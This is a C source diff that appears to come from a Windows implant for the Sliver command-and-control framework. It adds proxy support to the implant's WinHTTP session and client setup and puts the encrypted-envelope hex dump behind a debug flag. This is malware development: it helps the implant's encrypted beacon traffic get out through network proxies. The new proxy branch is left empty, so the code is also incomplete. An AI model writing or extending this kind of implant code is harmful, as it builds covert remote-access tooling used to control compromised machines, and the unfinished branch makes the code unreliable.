@@ -257,14 +257,22 @@ static DWORD WinHttpDefaultProxyConstant(VOID)
 
 PHTTP_SESSION HttpSessionInit
 (
-	_In_ PURI pUri
+	_In_ PURI pUri,
+	_In_ LPWSTR lpProxy,
+	_In_ LPWSTR lpProxyBypass
 )
 {
 	PHTTP_SESSION Result = NULL;
 	LPWSTR lpFullUri = NULL;
 
 	Result = ALLOC(sizeof(HTTP_SESSION));
-	Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	if (lpProxy == NULL) {
+		Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	}
+	else {
+
+	}
+
 	if (!Result->hSession) {
 		LOG_ERROR("WinHttpOpen", GetLastError());
 		FreeHttpSession(Result);
@@ -285,7 +293,9 @@ CLEANUP:
 
 PHTTP_CLIENT HttpClientInit
 (
-	_In_ PURI pUri
+	_In_ PURI pUri,
+	_In_ LPWSTR lpProxy,
+	_In_ LPWSTR lpProxyBypass
 )
 {
 	PHTTP_CLIENT Result = NULL;
@@ -294,7 +304,7 @@ PHTTP_CLIENT HttpClientInit
 	lpHostName = ConvertCharToWchar(pUri->lpHostName);
 	Result = ALLOC(sizeof(HTTP_CLIENT));
 	Result->pUri = pUri;
-	Result->pHttpSession = HttpSessionInit(pUri);
+	Result->pHttpSession = HttpSessionInit(pUri, lpProxy, lpProxyBypass);
 	if (Result->pHttpSession == NULL) {
 		FreeHttpClient(Result);
 		Result = NULL;
@@ -757,18 +767,15 @@ BOOL HttpSend
 		goto CLEANUP;
 	}
 
+#ifdef _DEBUG
 	if (pEnvelope->pData != NULL) {
 		PrintFormatA("Write Envelope:\n");
-		if (pEnvelope->pData->cbBuffer > 0x1000) {
-			HexDump(pEnvelope->pData->pBuffer, 0x1000);
-		}
-		else {
-			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-		}
+		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	}
 	else {
 		PrintFormatW(L"Write Envelope: []\n");
 	}
+#endif
 
 	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
